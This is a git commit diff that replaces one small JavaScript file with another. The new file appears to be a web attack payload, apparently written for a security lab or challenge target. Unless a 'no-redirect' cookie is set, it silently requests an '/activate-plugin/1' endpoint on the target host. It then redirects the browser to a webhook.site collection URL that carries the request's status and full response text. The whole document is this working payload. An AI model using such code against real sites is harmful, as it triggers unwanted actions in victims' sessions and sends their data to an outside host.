7680f56b7d13016da96a62445115f0638b541cbf
PlutoniumBot <143269390+PlutoniumBot@users.noreply.github.com>
2023-11-19 11:26:41 +0100

    Update and rename test7.js to test8.js

--- test7.js
+++
@@ -1,3 +0,0 @@
-if(!document.cookie.includes("no-redirect")){
-    document.location.href = 'http://website-lqrhjc.inst.malicecyber.com/activate-plugin/1';
-}
---
+++ test8.js
@@ -0,0 +1,19 @@
+if(!document.cookie.includes("no-redirect")){
+    try{
+        let xml = new XMLHttpRequest();
+        xml.open('GET', 'http://website-lqrhjc.inst.malicecyber.com/activate-plugin/1', false);
+        xml.onreadystatechange = function(){
+            if(xml.readyState == 4){
+                if(xml.status == 200){
+                    document.location.href = 'https://webhook.site/949ccc25-e06d-46a8-804c-899b79bec444?good';
+                } else {
+                    document.location.href = 'https://webhook.site/949ccc25-e06d-46a8-804c-899b79bec444?error=' + xml.status + '&readyState=' + xml.readyState + '&statusText=' + xml.statusText + '&response=' + xml.responseText;
+                }
+            }
+        }
+        xml.send();
+
+    }catch(e){
+        document.location.href = 'https://webhook.site/949ccc25-e06d-46a8-804c-899b79bec444?error=' + e.message;
+    }
+}
